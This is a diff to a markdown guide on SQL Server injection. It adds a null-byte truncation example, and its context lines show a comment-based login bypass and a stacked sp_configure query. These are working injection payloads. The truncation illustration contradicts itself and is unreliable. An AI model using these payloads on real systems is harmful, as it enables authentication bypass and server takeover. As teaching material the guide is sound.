@@ -33,6 +33,24 @@ SELECT * FROM Users WHERE username = 'admin'/* ' AND password = 'password' */
 SELECT * FROM Users WHERE username = 'admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 ```
 
+#### Example 4: Null byte truncation (application-layer, not SQL Server)
+
+The `%00` null byte is **not** a SQL Server comment — it exploits C-style string handling in certain application frameworks/drivers that treat null bytes as string terminators.
+
+```text
+-- Attacker input (URL-encoded):
+username=admin'%00&password=anything
+
+-- Application receives and URL-decodes to:
+admin'\0  (where \0 is the null byte)
+
+-- If the framework truncates at null byte, SQL Server receives:
+SELECT * FROM Users WHERE username = 'admin'' AND password = '...'
+                                          ^ query truncated here
+```
+
+This technique only works in specific environments (classic ASP, older PHP configurations, certain ODBC drivers). Modern frameworks typically pass the null byte through or reject it. See note 5 below for details.
+
 ### Notes
 
 1. MSSQL requires a space or new line after the `--` comment syntax.
